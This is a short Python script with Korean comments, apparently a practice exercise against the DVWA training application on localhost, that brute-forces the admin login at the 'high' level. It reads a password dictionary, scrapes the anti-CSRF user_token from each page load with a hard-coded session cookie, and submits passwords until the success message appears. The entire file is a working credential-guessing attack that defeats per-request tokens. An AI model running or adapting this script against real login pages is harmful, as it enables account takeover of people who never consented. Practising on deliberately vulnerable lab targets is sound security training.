#high단계 랜덤난수가 없을 때 토큰을 우회하는 공격코드
import urllib           # URL 작업을 위한 여러 모듈을 모은 패키지입니다
import urllib.parse     # URL을 구성 요소로 구문 분석
import urllib.request   #url의 반응을 살피는 모듈
import requests         #HTTP 요청을 보내는 모듈



def Web_Attack():
    file= open('E:\\python_coding\\dvwa\\1.Bruteforce\\dictionary_attack.txt', 'r')
    passwords = file.readlines()
    for password in passwords:
        url = "http://localhost/3.dvwa/1.brutefource/1-3.bruteforce-GET.php"
        cookies={"PHPSESSID":"n0r3cn3mkdqmb5uhhok267btf8"}
        res = requests.get(url, cookies=cookies)  
        search_string = "name='user_token' value= "
        string_position = res.text.find(search_string)
        search_position = string_position+len(search_string)
        if string_position > 0:
            token = res.text[search_position:res.text.find(" /", search_position)]   
        payload = {'username':'admin',
                 'password':password.replace('\n', '')
                 ,'Login':'Login'
                 ,'user_token':token}
        r = requests.get(url,payload)                      #url post 방식에다가 집어 넣는다
        if(r.text.find("Congratulations") > 0):
            print("사용된 유저토큰: "+token)
            print("공격성공 비밀번호는 "+password)
            break
        else : 
            print("사용된 유저토큰: "+token)
            print("암호실패!! 공격하는 문자: "+password)
          #34f4ce6696efba896bf3d69e8bb818be
      

if __name__ == '__main__':
    print("무차별대입 공격")
    Web_Attack()

